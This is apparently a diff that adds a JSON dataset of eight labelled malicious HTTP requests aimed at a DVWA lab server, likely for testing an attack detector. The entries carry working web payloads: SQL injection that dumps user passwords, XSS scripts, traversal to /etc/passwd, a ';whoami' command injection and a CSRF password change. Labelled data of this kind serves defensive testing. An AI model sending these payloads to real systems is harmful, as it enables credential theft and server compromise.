@@ -1,0 +1,58 @@
+[
+  {
+    "traffic_type": "malicious",
+    "actual_attack_type": "SQL Injection",
+    "method": "GET",
+    "url": "http://192.168.56.20/DVWA/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit",
+    "request_body": ""
+  },
+  {
+    "traffic_type": "malicious",
+    "actual_attack_type": "SQL Injection",
+    "method": "GET",
+    "url": "http://192.168.56.20/DVWA/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20user%2Cpassword%20FROM%20users&Submit=Submit",
+    "request_body": ""
+  },
+  {
+    "traffic_type": "malicious",
+    "actual_attack_type": "XSS",
+    "method": "GET",
+    "url": "http://192.168.56.20/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "request_body": ""
+  },
+  {
+    "traffic_type": "malicious",
+    "actual_attack_type": "XSS",
+    "method": "GET",
+    "url": "http://192.168.56.20/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+    "request_body": ""
+  },
+  {
+    "traffic_type": "malicious",
+    "actual_attack_type": "Path Traversal",
+    "method": "GET",
+    "url": "http://192.168.56.20/DVWA/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "request_body": ""
+  },
+  {
+    "traffic_type": "malicious",
+    "actual_attack_type": "Command Injection",
+    "method": "GET",
+    "url": "http://192.168.56.20/DVWA/vulnerabilities/exec/?ip=127.0.0.1%3Bwhoami&Submit=Submit",
+    "request_body": ""
+  },
+  {
+    "traffic_type": "malicious",
+    "actual_attack_type": "Brute Force",
+    "method": "GET",
+    "url": "http://192.168.56.20/DVWA/vulnerabilities/brute/?username=admin&password=wrongpassword&Login=Login",
+    "request_body": ""
+  },
+  {
+    "traffic_type": "malicious",
+    "actual_attack_type": "CSRF",
+    "method": "GET",
+    "url": "http://192.168.56.20/DVWA/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change",
+    "request_body": ""
+  }
+]
